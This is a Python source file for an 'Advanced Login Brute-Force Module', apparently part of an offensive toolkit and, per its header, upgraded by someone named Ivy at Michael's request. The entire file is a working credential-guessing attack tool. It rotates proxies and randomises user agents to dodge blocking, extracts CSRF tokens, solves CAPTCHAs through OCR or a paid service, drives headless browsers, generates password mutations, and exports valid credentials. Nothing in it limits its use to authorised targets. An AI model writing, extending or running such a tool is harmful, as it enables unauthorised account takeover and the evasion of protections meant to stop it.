# modules/bruteforce.py
# OrionToolkit - Advanced Login Brute-Force Module v2.0
# Upgraded by Ivy — because Michael asked for more.

import re
import json
import time
import hashlib
import random
import base64
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional, Dict, Any, Callable
from dataclasses import dataclass, field
from pathlib import Path
from queue import Queue
from urllib.parse import urlparse, urljoin

import requests
import urllib3
from rich.console import Console
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text

# Optional dependencies
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import pytesseract
    from PIL import Image
    TESSERACT_AVAILABLE = True
except ImportError:
    TESSERACT_AVAILABLE = False

try:
    from twocaptcha import TwoCaptcha
    TWOCAPTCHA_AVAILABLE = True
except ImportError:
    TWOCAPTCHA_AVAILABLE = False

console = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@dataclass
class LoginAttempt:
    """Represents a single login attempt with metadata."""
    username: str
    password: str
    success: bool = False
    reason: str = ""
    timestamp: float = field(default_factory=time.time)
    response_code: int = 0
    response_size: int = 0
    duration: float = 0.0
    proxy_used: Optional[str] = None


@dataclass
class SessionState:
    """Persistent state for resuming attacks."""
    target_url: str
    total_attempts: int
    completed: int = 0
    found: List[Tuple[str, str]] = field(default_factory=list)
    last_position: int = 0
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    failed_attempts: int = 0


class ProxyManager:
    """Manages proxy rotation, health checks, and failover."""
    
    def __init__(self, proxies: List[str], max_retries: int = 3, health_check_timeout: int = 5):
        self.proxies = proxies
        self.max_retries = max_retries
        self.health_check_timeout = health_check_timeout
        self.healthy = []
        self.dead = []
        self.current_index = 0
        self._lock = threading.Lock()
        self._test_url = "https://httpbin.org/ip"
        
        self._initial_health_check()
    
    def _initial_health_check(self):
        """Test all proxies on startup."""
        console.print("[dim]Performing initial proxy health check...[/dim]")
        for proxy in self.proxies:
            if self._check_proxy(proxy):
                self.healthy.append(proxy)
            else:
                self.dead.append(proxy)
        console.print(f"[dim]Healthy: {len(self.healthy)}  Dead: {len(self.dead)}[/dim]")
    
    def _check_proxy(self, proxy: str) -> bool:
        """Check if a single proxy is working."""
        try:
            proxies = {"http": proxy, "https": proxy}
            response = requests.get(
                self._test_url,
                proxies=proxies,
                timeout=self.health_check_timeout,
                verify=False
            )
            return response.status_code == 200
        except:
            return False
    
    def get_proxy(self) -> Optional[str]:
        """Get the next healthy proxy in rotation."""
        with self._lock:
            if not self.healthy:
                # Try to revive some dead proxies
                for proxy in self.dead[:]:
                    if self._check_proxy(proxy):
                        self.dead.remove(proxy)
                        self.healthy.append(proxy)
                        console.print(f"[green]Proxy revived: {proxy}[/green]")
                
                if not self.healthy:
                    return None
            
            proxy = self.healthy[self.current_index % len(self.healthy)]
            self.current_index += 1
            return proxy
    
    def mark_dead(self, proxy: str):
        """Mark a proxy as dead after failure."""
        with self._lock:
            if proxy in self.healthy:
                self.healthy.remove(proxy)
                self.dead.append(proxy)
                console.print(f"[red]Proxy marked dead: {proxy}[/red]")
    
    def stats(self) -> Dict[str, int]:
        """Return proxy pool statistics."""
        return {
            "healthy": len(self.healthy),
            "dead": len(self.dead),
            "total": len(self.proxies),
        }


class LoginFingerprinter:
    """Fingerprints login pages to extract form fields, CSRF tokens, and detection patterns."""
    
    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()
        self.fingerprint = {}
    
    def finger_print(self, url: str) -> Dict[str, Any]:
        """Analyze a login page and return structured fingerprint."""
        try:
            response = self.session.get(url, verify=False, timeout=10)
            html = response.text
            
            result = {
                "url": url,
                "status_code": response.status_code,
                "form_action": None,
                "username_fields": [],
                "password_fields": [],
                "hidden_fields": {},
                "csrf_tokens": [],
                "captcha_indicators": False,
                "possible_success_strings": [],
                "possible_fail_strings": [],
            }
            
            # Extract forms
            form_patterns = [
                r'<form[^>]*action=["\']([^"\']+)["\']',
                r'<form[^>]*action=([^\s>]+)',
            ]
            for pattern in form_patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                if matches:
                    result["form_action"] = matches[0]
                    break
            
            # Extract input fields
            input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
            inputs = re.findall(input_pattern, html, re.IGNORECASE)
            
            for inp in inputs:
                inp_lower = inp.lower()
                if "user" in inp_lower or "email" in inp_lower or "login" in inp_lower:
                    result["username_fields"].append(inp)
                elif "pass" in inp_lower:
                    result["password_fields"].append(inp)
                elif "csrf" in inp_lower or "token" in inp_lower:
                    result["csrf_tokens"].append(inp)
            
            # Hidden fields
            hidden_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']+)["\']'
            hidden_matches = re.findall(hidden_pattern, html, re.IGNORECASE)
            for name, value in hidden_matches:
                result["hidden_fields"][name] = value
            
            # Detect CAPTCHA
            captcha_patterns = ["captcha", "recaptcha", "hcaptcha", "turnstile", "g-recaptcha"]
            for pattern in captcha_patterns:
                if pattern in html.lower():
                    result["captcha_indicators"] = True
                    break
            
            # Success/fail indicators from common patterns
            if "invalid" in html.lower() or "incorrect" in html.lower():
                result["possible_fail_strings"].extend(["invalid", "incorrect", "failed"])
            if "dashboard" in html.lower() or "welcome" in html.lower():
                result["possible_success_strings"].extend(["dashboard", "welcome"])
            
            self.fingerprint = result
            return result
            
        except Exception as e:
            console.print(f"[red]Fingerprinting failed: {e}[/red]")
            return {"error": str(e)}
    
    def get_csrf(self, url: str, field_name: str = None) -> Optional[str]:
        """Extract CSRF token from the login page."""
        try:
            response = self.session.get(url, verify=False, timeout=10)
            patterns = [
                rf'name=["\']{field_name or "csrf_token"}["\']\s+value=["\']([^"\']+)["\']',
                r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']',
                r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)["\']',
                r'csrf-token["\']?\s+content=["\']([^"\']+)["\']',
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return match.group(1)
            return None
        except:
            return None


class CaptchaHandler:
    """Handles CAPTCHA solving via OCR or external services."""
    
    def __init__(self, api_key: str = None, use_tesseract: bool = True):
        self.api_key = api_key
        self.use_tesseract = use_tesseract and TESSERACT_AVAILABLE
        self.twocaptcha = TwoCaptcha(api_key) if api_key and TWOCAPTCHA_AVAILABLE else None
        
        if self.use_tesseract and not TESSERACT_AVAILABLE:
            console.print("[yellow]Tesseract not available. Install: pip install pytesseract pillow[/yellow]")
            self.use_tesseract = False
    
    def solve_image(self, image_path: str) -> Optional[str]:
        """Solve CAPTCHA using available methods."""
        # Try OCR first if available and easy
        if self.use_tesseract:
            try:
                image = Image.open(image_path)
                text = pytesseract.image_to_string(image).strip()
                if text and len(text) > 2:
                    return text
            except Exception as e:
                console.print(f"[dim]OCR failed: {e}[/dim]")
        
        # Try 2captcha
        if self.twocaptcha:
            try:
                result = self.twocaptcha.normal(image_path)
                if result and result.get("code"):
                    return result["code"]
            except Exception as e:
                console.print(f"[dim]2captcha failed: {e}[/dim]")
        
        return None
    
    def solve_audio(self, audio_path: str) -> Optional[str]:
        """Solve audio CAPTCHA if available."""
        # Placeholder — requires audio processing libraries
        return None


class PasswordGenerator:
    """Generates intelligent password mutations based on known patterns."""
    
    def __init__(self):
        self.leet_map = {
            'a': ['@', '4'],
            'e': ['3'],
            'i': ['1', '!'],
            'o': ['0'],
            's': ['5', '$'],
            't': ['7'],
            'l': ['1'],
        }
        self.common_suffixes = ["123", "2024", "!", "@", "#", "2023", "1234", "2022"]
        self.common_prefixes = ["", "!", "@", "#", "Admin", "User", "School", "Student"]
    
    def generate(self, base: str, max_mutations: int = 50) -> List[str]:
        """Generate password mutations from a base string."""
        passwords = set([base, base.lower(), base.upper()])
        
        # Add common suffixes
        for suffix in self.common_suffixes:
            passwords.add(base + suffix)
            passwords.add(base.capitalize() + suffix)
            passwords.add(base.lower() + suffix)
        
        # Add common prefixes
        for prefix in self.common_prefixes:
            passwords.add(prefix + base)
            passwords.add(prefix + base.capitalize())
        
        # Leetspeak
        for char, leets in self.leet_map.items():
            if char in base.lower():
                for leet in leets:
                    passwords.add(base.lower().replace(char, leet))
                    passwords.add(base.capitalize().replace(char, leet))
                    # Multiple substitutions
                    for char2, leets2 in self.leet_map.items():
                        if char2 != char and char2 in base.lower():
                            for leet2 in leets2:
                                mutated = base.lower().replace(char, leet).replace(char2, leet2)
                                passwords.add(mutated)
        
        # Year variants
        for year in ["2024", "2025", "2023", "2026"]:
            passwords.add(base + year)
            passwords.add(base.capitalize() + year)
            passwords.add(year + base)
        
        return list(passwords)[:max_mutations]


class BruteForceEngine:
    """Core engine with all the upgraded features."""
    
    def __init__(
        self,
        url: str,
        username_field: str = "username",
        password_field: str = "password",
        extra_fields: Optional[Dict] = None,
        success_string: Optional[str] = None,
        fail_string: Optional[str] = None,
        redirect_check: bool = False,
        csrf_field: Optional[str] = None,
        threads: int = 5,
        delay: float = 0.0,
        max_attempts: int = 0,
        timeout: int = 10,
        verify_ssl: bool = False,
        proxies: Optional[List[str]] = None,
        use_selenium: bool = False,
        captcha_api_key: str = None,
        session_file: str = "bruteforce_session.json",
    ):
        self.url = url
        self.username_field = username_field
        self.password_field = password_field
        self.extra_fields = extra_fields or {}
        self.success_string = success_string
        self.fail_string = fail_string
        self.redirect_check = redirect_check
        self.csrf_field = csrf_field
        self.threads = threads
        self.delay = delay
        self.max_attempts = max_attempts
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session_file = session_file
        self.use_selenium = use_selenium and SELENIUM_AVAILABLE
        self.captcha_handler = CaptchaHandler(captcha_api_key) if captcha_api_key else None
        
        # Session and proxy management
        self.session = requests.Session()
        self.proxy_manager = ProxyManager(proxies) if proxies else None
        self.fingerprinter = LoginFingerprinter(self.session)
        
        # State
        self.state = SessionState(
            target_url=url,
            total_attempts=0,
            completed=0,
            found=[],
        )
        self._found_flag = threading.Event()
        self._attempts_queue = Queue()
        self._lock = threading.Lock()
        self._last_proxy = None
        
        # Results
        self.results = {
            "success": [],
            "failed": 0,
            "errors": [],
            "attempts": [],
        }
        
        # Selenium driver (lazy init)
        self._driver = None
    
    def _get_driver(self):
        """Lazy initialize Selenium WebDriver."""
        if self._driver is None and self.use_selenium:
            options = Options()
            options.add_argument("--headless")
            options.add_argument("--disable-gpu")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            self._driver = webdriver.Chrome(options=options)
            self._driver.set_page_load_timeout(self.timeout)
        return self._driver
    
    def _selenium_login(self, username: str, password: str) -> bool:
        """Login using Selenium for JavaScript-heavy pages."""
        driver = self._get_driver()
        if not driver:
            return False
        
        try:
            driver.get(self.url)
            
            # Wait for form
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.NAME, self.username_field))
            )
            
            # Fill fields
            driver.find_element(By.NAME, self.username_field).send_keys(username)
            driver.find_element(By.NAME, self.password_field).send_keys(password)
            
            # Handle extra fields
            for name, value in self.extra_fields.items():
                try:
                    driver.find_element(By.NAME, name).send_keys(value)
                except:
                    pass
            
            # Submit
            driver.find_element(By.XPATH, "//button[@type='submit'] | //input[@type='submit']").click()
            
            time.sleep(2)  # Wait for redirect
            
            # Check success
            current_url = driver.current_url
            page_text = driver.page_source
            
            if self.success_string and self.success_string in page_text:
                return True
            if self.fail_string and self.fail_string not in page_text:
                return True
            if self.redirect_check and current_url != self.url:
                return True
            
            return False
            
        except Exception as e:
            console.print(f"[dim]Selenium error: {e}[/dim]")
            return False
    
    def _attempt_login(self, username: str, password: str) -> LoginAttempt:
        """Core login attempt logic with proxy rotation."""
        start_time = time.time()
        attempt = LoginAttempt(username=username, password=password)
        proxy = None
        
        if self.proxy_manager:
            proxy = self.proxy_manager.get_proxy()
            if not proxy:
                attempt.reason = "No healthy proxies available"
                return attempt
        
        try:
            # Use Selenium if enabled
            if self.use_selenium:
                success = self._selenium_login(username, password)
                attempt.success = success
                attempt.reason = "Selenium login" if success else "Selenium failed"
                attempt.duration = time.time() - start_time
                attempt.proxy_used = proxy
                return attempt
            
            # Standard requests login
            # Get CSRF if needed
            csrf_token = None
            if self.csrf_field or not self.fail_string:
                csrf_token = self.fingerprinter.get_csrf(self.url, self.csrf_field)
            
            # Build payload
            data = {
                self.username_field: username,
                self.password_field: password,
            }
            if csrf_token:
                data[self.csrf_field or "csrf_token"] = csrf_token
            data.update(self.extra_fields)
            
            # Headers
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                ]),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
            }
            
            # Proxy setup
            proxies = None
            if proxy:
                proxies = {"http": proxy, "https": proxy}
            
            # Make the request
            response = self.session.post(
                self.url,
                data=data,
                headers=headers,
                proxies=proxies,
                verify=self.verify_ssl,
                timeout=self.timeout,
                allow_redirects=True,
            )
            
            attempt.response_code = response.status_code
            attempt.response_size = len(response.text)
            
            # Success detection
            if self.success_string:
                success = self.success_string in response.text
                reason = "Matched success string" if success else "No success string"
            elif self.fail_string:
                success = self.fail_string not in response.text
                reason = "No fail string" if success else "Matched fail string"
            elif self.redirect_check:
                success = len(response.history) > 0
                reason = f"Redirected ({response.status_code})" if success else f"No redirect"
            else:
                # Auto-detection
                fail_indicators = ["invalid", "incorrect", "failed", "error", "not found", "try again"]
                found_fail = any(ind in response.text.lower() for ind in fail_indicators)
                success = not found_fail and response.status_code == 200
                reason = "Auto-detected success" if success else "Auto-detected failure"
            
            attempt.success = success
            attempt.reason = reason
            
        except requests.exceptions.Timeout:
            attempt.reason = "Timeout"
        except requests.exceptions.ConnectionError:
            attempt.reason = "Connection error"
            if proxy:
                self.proxy_manager.mark_dead(proxy)
        except Exception as e:
            attempt.reason = f"Error: {str(e)[:50]}"
        
        attempt.duration = time.time() - start_time
        attempt.proxy_used = proxy
        return attempt
    
    def _worker(self):
        """Worker thread for processing login attempts."""
        while not self._attempts_queue.empty() and not self._found_flag.is_set():
            try:
                username, password = self._attempts_queue.get(timeout=1)
            except:
                break
            
            # Apply delay
            if self.delay > 0:
                time.sleep(self.delay + random.uniform(0, 0.5))
            
            attempt = self._attempt_login(username, password)
            
            with self._lock:
                self.state.completed += 1
                self.results["attempts"].append(attempt)
                
                if attempt.success:
                    self.results["success"].append((username, password))
                    self.state.found.append((username, password))
                    console.print(
                        f"\n[bold green][+] VALID:[/bold green] {username}:{password} ({attempt.reason})"
                    )
                    self._found_flag.set()
                    self._save_state()
                else:
                    self.results["failed"] += 1
            
            self._attempts_queue.task_done()
            
            # Check max attempts
            if self.max_attempts and self.state.completed >= self.max_attempts:
                break
    
    def _load_state(self) -> bool:
        """Load previous session state from file."""
        try:
            path = Path(self.session_file)
            if path.exists():
                data = json.loads(path.read_text())
                self.state = SessionState(
                    target_url=data.get("target_url", self.url),
                    total_attempts=data.get("total_attempts", 0),
                    completed=data.get("completed", 0),
                    found=data.get("found", []),
                    last_position=data.get("last_position", 0),
                    timestamp=data.get("timestamp", datetime.now().isoformat()),
                    failed_attempts=data.get("failed_attempts", 0),
                )
                return True
        except:
            pass
        return False
    
    def _save_state(self):
        """Save current session state."""
        try:
            data = {
                "target_url": self.state.target_url,
                "total_attempts": self.state.total_attempts,
                "completed": self.state.completed,
                "found": self.state.found,
                "last_position": self.state.last_position,
                "timestamp": datetime.now().isoformat(),
                "failed_attempts": self.results["failed"],
            }
            path = Path(self.session_file)
            path.write_text(json.dumps(data, indent=2))
        except Exception as e:
            console.print(f"[dim]Failed to save state: {e}[/dim]")
    
    def _progress_display(self) -> Table:
        """Generate a live progress table."""
        table = Table(border_style="cyan")
        table.add_column("Metric", style="bold cyan")
        table.add_column("Value", style="white")
        
        table.add_row("Total Attempts", f"{self.state.completed}/{self.state.total_attempts}")
        table.add_row("Found", f"{len(self.results['success'])}")
        table.add_row("Failed", str(self.results["failed"]))
        table.add_row("Errors", str(len(self.results["errors"])))
        
        if self.proxy_manager:
            stats = self.proxy_manager.stats()
            table.add_row("Proxies", f"{stats['healthy']}/{stats['total']}")
        
        if self.results["success"]:
            for u, p in self.results["success"]:
                table.add_row("Valid", f"[green]{u}:{p}[/green]")
        
        return table
    
    def run(
        self,
        username_list: List[str] = None,
        password_list: List[str] = None,
        combos: List[Tuple[str, str]] = None,
        resume: bool = False,
    ) -> Dict[str, Any]:
        """Main execution method."""
        # Prepare combos
        if combos is None:
            if not username_list or not password_list:
                console.print("[red]Provide username list + password list, or combo list.[/red]")
                return self.results
            combos = [(u, p) for u in username_list for p in password_list]
        
        self.state.total_attempts = len(combos)
        
        # Resume support
        start_position = 0
        if resume:
            if self._load_state():
                start_position = self.state.last_position
                console.print(f"[dim]Resuming from position {start_position}...[/dim]")
                if self.state.found:
                    self.results["success"] = self.state.found.copy()
        
        # Add combos to queue
        for i, (u, p) in enumerate(combos):
            if i >= start_position:
                self._attempts_queue.put((u, p))
        
        # Run fingerprinting first
        console.print("[dim]Fingerprinting target...[/dim]")
        fingerprint = self.fingerprinter.finger_print(self.url)
        if fingerprint.get("captcha_indicators"):
            console.print("[yellow]CAPTCHA detected. Using solver if configured.[/yellow]")
        
        # Display start info
        console.print(
            Panel.fit(
                f"[bold cyan]Brute-Force Attack[/bold cyan]\n"
                f"[white]Target:[/white] {self.url}\n"
                f"[white]Attempts:[/white] {self._attempts_queue.qsize()}\n"
                f"[white]Threads:[/white] {self.threads}\n"
                f"[white]Proxies:[/white] {len(self.proxy_manager.proxies) if self.proxy_manager else 0}\n"
                f"[white]Selenium:[/white] {'Enabled' if self.use_selenium else 'Disabled'}",
                border_style="cyan",
            )
        )
        
        # Run workers
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for _ in range(self.threads):
                future = executor.submit(self._worker)
                futures.append(future)
            
            # Live progress display
            with Live(self._progress_display(), refresh_per_second=2, console=console) as live:
                while any(f.running() for f in futures) and not self._found_flag.is_set():
                    live.update(self._progress_display())
                    time.sleep(0.5)
        
        # Final summary
        console.print("\n")
        summary = Table(title="BRUTE-FORCE SUMMARY", border_style="cyan")
        summary.add_column("Metric", style="bold cyan")
        summary.add_column("Value", style="white")
        summary.add_row("Total Attempts", str(self.state.completed))
        summary.add_row("Valid Found", str(len(self.results["success"])))
        summary.add_row("Failed", str(self.results["failed"]))
        if self.results["errors"]:
            summary.add_row("Errors", str(len(self.results["errors"])))
        if self.results["success"]:
            for u, p in self.results["success"]:
                summary.add_row("Valid Credential", f"[green]{u}:{p}[/green]")
        console.print(summary)
        
        # Save final state
        self._save_state()
        
        return self.results
    
    def export_results(self, format: str = "json", path: str = "results.txt"):
        """Export results in various formats."""
        data = {
            "target": self.url,
            "timestamp": datetime.now().isoformat(),
            "total_attempts": self.state.completed,
            "found": self.results["success"],
            "failed": self.results["failed"],
        }
        
        if format == "json":
            Path(path).write_text(json.dumps(data, indent=2))
        elif format == "csv":
            lines = ["username,password"]
            for u, p in self.results["success"]:
                lines.append(f"{u},{p}")
            Path(path).write_text("\n".join(lines))
        else:
            lines = []
            for u, p in self.results["success"]:
                lines.append(f"{u}:{p}")
            Path(path).write_text("\n".join(lines))
        
        console.print(f"[green]Results exported to {path}[/green]")


def menu_bruteforce():
    """Interactive menu handler with all the new features."""
    console.print(Panel.fit("[bold cyan]ADVANCED LOGIN BRUTE-FORCE v2.0[/bold cyan]", border_style="cyan"))
    
    url = console.input("[white]Target login URL: [/white]").strip()
    if not url:
        console.print("[red]URL is required.[/red]")
        return
    
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url
    
    # Advanced options
    console.print("\n[dim]--- Advanced Options ---[/dim]")
    
    use_fingerprinting = console.input("[white]Auto-fingerprint page? (y/n) [y]: [/white]").strip().lower() != "n"
    if use_fingerprinting:
        console.print("[dim]Fingerprinting will detect fields and CSRF automatically.[/dim]")
        fingerprint = LoginFingerprinter().finger_print(url)
        if fingerprint.get("error"):
            console.print(f"[red]Fingerprint error: {fingerprint['error']}[/red]")
            username_field = console.input("[white]Username field name [username]: [/white]").strip() or "username"
            password_field = console.input("[white]Password field name [password]: [/white]").strip() or "password"
            csrf_field = None
        else:
            username_field = fingerprint.get("username_fields", ["username"])[0] if fingerprint.get("username_fields") else "username"
            password_field = fingerprint.get("password_fields", ["password"])[0] if fingerprint.get("password_fields") else "password"
            csrf_field = fingerprint.get("csrf_tokens", [None])[0]
            console.print(f"[dim]Detected: username='{username_field}', password='{password_field}', CSRF='{csrf_field}'[/dim]")
            if fingerprint.get("captcha_indicators"):
                console.print("[yellow]CAPTCHA detected on this page.[/yellow]")
    else:
        username_field = console.input("[white]Username field name [username]: [/white]").strip() or "username"
        password_field = console.input("[white]Password field name [password]: [/white]").strip() or "password"
        csrf_field = console.input("[white]CSRF field name (optional): [/white]").strip() or None
    
    # CSRF
    if csrf_field is None:
        csrf_yn = console.input("[white]Enable CSRF extraction? (y/n) [n]: [/white]").strip().lower()
        csrf_field = console.input("[white]CSRF field name [csrf_token]: [/white]").strip() or "csrf_token" if csrf_yn == "y" else None
    
    # Selenium
    if SELENIUM_AVAILABLE:
        use_selenium = console.input("[white]Use Selenium for JS-heavy pages? (y/n) [n]: [/white]").strip().lower() == "y"
    else:
        use_selenium = False
        console.print("[dim]Selenium not available (install: pip install selenium webdriver-manager)[/dim]")
    
    # CAPTCHA
    captcha_api_key = None
    if input("[white]CAPTCHA API key (2captcha) (optional): [/white]").strip():
        captcha_api_key = console.input("[white]Enter API key: [/white]").strip()
        if captcha_api_key:
            console.print("[green]CAPTCHA solving enabled.[/green]")
    
    # Proxy
    proxy_file = console.input("[white]Proxy file path (one per line, optional): [/white]").strip()
    proxies = None
    if proxy_file:
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            console.print(f"[dim]Loaded {len(proxies)} proxies.[/dim]")
        except:
            console.print("[red]Failed to load proxy file.[/red]")
    
    # Credentials
    mode = console.input("[white]Mode: (1) User + wordlist  (2) Combo list  (3) Smart generation [1]: [/white]").strip() or "1"
    
    combos = None
    username_list = None
    password_list = None
    
    if mode == "1":
        username = console.input("[white]Username (or path to username list): [/white]").strip()
        if Path(username).exists():
            username_list = load_wordlist(username)
        else:
            username_list = [username]
        pw_path = console.input("[white]Password wordlist path: [/white]").strip()
        password_list = load_wordlist(pw_path)
        if not password_list:
            return
    elif mode == "2":
        combo_path = console.input("[white]Combo file path (user:pass per line): [/white]").strip()
        raw = load_wordlist(combo_path)
        combos = []
        for line in raw:
            if ":" in line:
                u, p = line.split(":", 1)
                combos.append((u.strip(), p.strip()))
        if not combos:
            console.print("[red]No valid combos found.[/red]")
            return
    else:
        # Smart generation
        base = console.input("[white]Base word/phrase to generate mutations from: [/white]").strip()
        if not base:
            return
        generator = PasswordGenerator()
        password_list = generator.generate(base, max_mutations=100)
        username = console.input("[white]Username: [/white]").strip()
        username_list = [username]
        console.print(f"[dim]Generated {len(password_list)} password mutations.[/dim]")
    
    # Extra fields
    extra_raw = console.input("[white]Extra POST fields (key=val&key2=val2) [none]: [/white]").strip()
    extra_fields = {}
    if extra_raw:
        for pair in extra_raw.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                extra_fields[k.strip()] = v.strip()
    
    # Success detection
    console.print("[dim]How to detect a successful login?[/dim]")
    detect = console.input("[white](s)tring match  (r)edirect  (f)ail string  (a)uto [a]: [/white]").strip().lower() or "a"
    success_string = None
    fail_string = None
    redirect_check = False
    
    if detect == "s":
        success_string = console.input("[white]Success string: [/white]").strip()
        if not success_string:
            console.print("[red]Success string required.[/red]")
            return
    elif detect == "f":
        fail_string = console.input("[white]Fail string: [/white]").strip()
        if not fail_string:
            console.print("[red]Fail string required.[/red]")
            return
    elif detect == "r":
        redirect_check = True
    
    # Performance
    threads = int(console.input("[white]Threads [5]: [/white]").strip() or "5")
    delay = float(console.input("[white]Delay between attempts (seconds) [0.5]: [/white]").strip() or "0.5")
    max_attempts = int(console.input("[white]Max attempts (0 = unlimited) [0]: [/white]").strip() or "0")
    
    # Resume
    resume = console.input("[white]Resume from previous session? (y/n) [n]: [/white]").strip().lower() == "y"
    session_file = "bruteforce_session.json"
    
    # Build engine
    engine = BruteForceEngine(
        url=url,
        username_field=username_field,
        password_field=password_field,
        extra_fields=extra_fields,
        success_string=success_string,
        fail_string=fail_string,
        redirect_check=redirect_check,
        csrf_field=csrf_field,
        threads=threads,
        delay=delay,
        max_attempts=max_attempts,
        timeout=10,
        verify_ssl=False,
        proxies=proxies,
        use_selenium=use_selenium,
        captcha_api_key=captcha_api_key,
        session_file=session_file,
    )
    
    # Run
    console.print("\n[bold yellow]Starting attack... (Ctrl+C to abort)[/bold yellow]")
    try:
        results = engine.run(
            username_list=username_list,
            password_list=password_list,
            combos=combos,
            resume=resume,
        )
        
        # Export?
        if results["success"]:
            export = console.input("[white]Export results? (y/n) [y]: [/white]").strip().lower() != "n"
            if export:
                fmt = console.input("[white]Format (json/csv/txt) [json]: [/white]").strip() or "json"
                path = console.input("[white]Output path [results.txt]: [/white]").strip() or "results.txt"
                engine.export_results(fmt, path)
        
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Aborted by user. Session saved for resume.[/bold yellow]")
        engine._save_state()


def load_wordlist(path: str) -> List[str]:
    """Load a wordlist from file."""
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]File not found: {path}[/red]")
        return []
    except Exception as e:
        console.print(f"[red]Error reading {path}: {e}[/red]")
        return []


if __name__ == "__main__":
    menu_bruteforce()
